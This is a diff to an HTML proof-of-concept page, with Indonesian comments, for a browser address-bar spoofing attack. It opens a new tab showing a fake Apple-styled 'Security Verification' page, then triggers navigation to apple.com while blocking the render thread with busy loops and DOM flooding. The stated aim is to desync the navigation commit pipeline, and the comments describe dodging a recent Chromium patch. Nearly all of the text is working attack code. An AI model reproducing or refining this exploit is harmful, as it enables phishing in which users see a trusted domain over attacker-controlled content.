@@ -6,13 +6,14 @@
       name="viewport"
       content="width=device-width, initial-scale=1, user-scalable=yes"
     />
-    <title>Reinforced Desync PoC - Zero</title>
+    <title>Ultimate Desync & Pipeline Deadlock PoC - Zero</title>
     <style>
       body, html {
         margin: 0;
         padding: 0;
         height: 100%;
-        background: #fafafa;
+        background: #000;
+        color: #fff;
         font-family: -apple-system, BlinkMacSystemFont, sans-serif;
       }
       .container {
@@ -23,25 +24,25 @@
         height: 100%;
       }
       button {
-        padding: 22px 44px;
-        font-size: 20px;
+        padding: 24px 48px;
+        font-size: 22px;
         font-weight: bold;
-        background: #007aff;
+        background: #ff3b30;
         color: #fff;
         border: none;
-        border-radius: 14px;
+        border-radius: 16px;
         cursor: pointer;
-        box-shadow: 0 8px 24px rgba(0, 122, 255, 0.35);
+        box-shadow: 0 8px 24px rgba(255, 59, 48, 0.4);
         transition: transform 0.1s ease;
       }
       button:active {
-        transform: scale(0.96);
+        transform: scale(0.95);
       }
     </style>
   </head>
   <body>
     <div class="container">
-      <button id="startBtn">EXECUTE REINFORCED PoC</button>
+      <button id="startBtn">EXECUTE ULTIMATE DEADLOCK TEST</button>
     </div>
 
     <script>
@@ -61,9 +62,9 @@
               <meta name="viewport" content="width=device-width, initial-scale=1">
             </head>
             <body style="margin:0;padding:0;background:#ffffff;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center;font-family:-apple-system,sans-serif;">
-              <div id="content-box">
+              <div id="wrapper">
                 <h1 style="font-size:42px;font-weight:700;color:#1d1d1f;margin:0 0 16px 0;">Security Verification</h1>
-                <p style="font-size:20px;color:#86868b;margin:0;">Synchronizing secure session with Apple...</p>
+                <p style="font-size:20px;color:#86868b;margin:0;">Establishing deep navigation pipeline sync...</p>
               </div>
             </body>
             </html>
@@ -75,35 +76,43 @@
             newTab.focus();
           } catch (e) {}
 
-          // 4. Tahap 1: Memicu navigasi asinkron murni ke domain target yang sah (apple.com)
+          // 4. Tahap 1: Memicu navigasi asinkron ganda (mengecoh antrean provisional navigation)
           setTimeout(() => {
             try {
+              // Membanjiri history state lokal terlebih dahulu untuk menciptakan state pending ganda
+              newTab.history.pushState({page: 1}, "", "#secure-auth");
               newTab.location.href = "https://apple.com";
             } catch (err) {
               console.error(err);
             }
-          }, 15);
+          }, 10);
 
-          // 5. Tahap 2: Menembak render thread dengan Forced Layout Reflow Stalling 
-          // (Menggantikan dialog modal agar lolos dari patch Chromium baru)
+          // 5. Tahap 2: Menembak render thread dengan Aggressive Layout Reflow & Event Loop Stalling
           setTimeout(() => {
             try {
               newTab.eval(`
                 const start = Date.now();
-                const targetBody = document.body;
-                while (Date.now() - start < 2000) {
-                  // Memaksa pembacaan layout properties secara sinkronus berulang-ulang 
-                  // untuk menjebak WebKit render engine agar gagal menyelesaikan commit pipeline.
-                  const forceReflow = targetBody.offsetHeight;
-                  targetBody.style.backgroundColor = (forceReflow % 2 === 0) ? '#ffffff' : '#fcfcfc';
+                const docBody = document.body;
+                while (Date.now() - start < 2500) {
+                  // Melakukan mutasi DOM berat secara konstan bersamaan dengan pembacaan layout properties
+                  // Ini mengunci event loop WebKit agar delegate callback tertunda secara permanen.
+                  const heightVal = docBody.offsetHeight;
+                  docBody.style.backgroundColor = (heightVal % 2 === 0) ? '#ffffff' : '#f9f9f9';
+                  
+                  // Memaksa eksekusi tugas mikro yang membebani antrean message loop
+                  const div = document.createElement('div');
+                  div.innerText = Math.random();
+                  docBody.appendChild(div);
+                  if (docBody.childNodes.length > 50) {
+                    docBody.innerHTML = '<h1>Locked State Active</h1>';
+                  }
                 }
               `);
             } catch (e) {
-              // Fallback lokal jika terhalang cross-origin context policy
               let start = Date.now();
-              while (Date.now() - start < 2000) {}
+              while (Date.now() - start < 2500) {}
             }
-          }, 95);
+          }, 75);
         }
       };
     </script>
